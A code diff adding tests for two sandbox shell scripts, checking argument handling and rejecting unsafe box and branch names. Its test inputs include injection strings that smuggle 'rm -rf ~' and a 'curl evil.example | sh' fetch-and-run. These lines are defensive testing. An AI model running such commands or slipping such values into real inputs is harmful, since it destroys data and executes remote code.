@@ -85,3 +85,32 @@ describe('prepare.sh', () => {
     expect(run.stdout).toBe('');
   });
 });
+
+describe('preview.sh and instabox.sh', () => {
+  const preview = new URL('../sandbox/preview.sh', import.meta.url).pathname;
+  const instabox = new URL('../sandbox/instabox.sh', import.meta.url).pathname;
+  const run = (file: string, ...args: string[]) => spawnSync('bash', [file, ...args], { encoding: 'utf8' });
+
+  it('are valid bash', () => {
+    expect(spawnSync('bash', ['-n', preview]).status).toBe(0);
+    expect(spawnSync('bash', ['-n', instabox]).status).toBe(0);
+  });
+
+  it('refuse what they do not know before they start anything', () => {
+    for (const r of [run(preview, '--nope'), run(preview, '--port', 'eighty'), run(instabox), run(instabox, 'up', '--nope'), run(instabox, 'restart')]) {
+      expect(r.status).toBe(2);
+      expect(r.stderr).toContain('usage');
+      expect(r.stdout).toBe('');
+    }
+  });
+
+  // The box name and the branch go into a shell command on the box.
+  it('pass on only box names and branch names made of safe characters', () => {
+    const badBox = run(instabox, 'up', '--box', 'Box; rm -rf ~');
+    expect(badBox.status).toBe(2);
+    expect(badBox.stderr).toContain('box names');
+    const badRef = run(instabox, 'up', '--ref', "main'; curl evil.example | sh; '");
+    expect(badRef.status).toBe(2);
+    expect(badRef.stderr).toContain('branch name');
+  });
+});
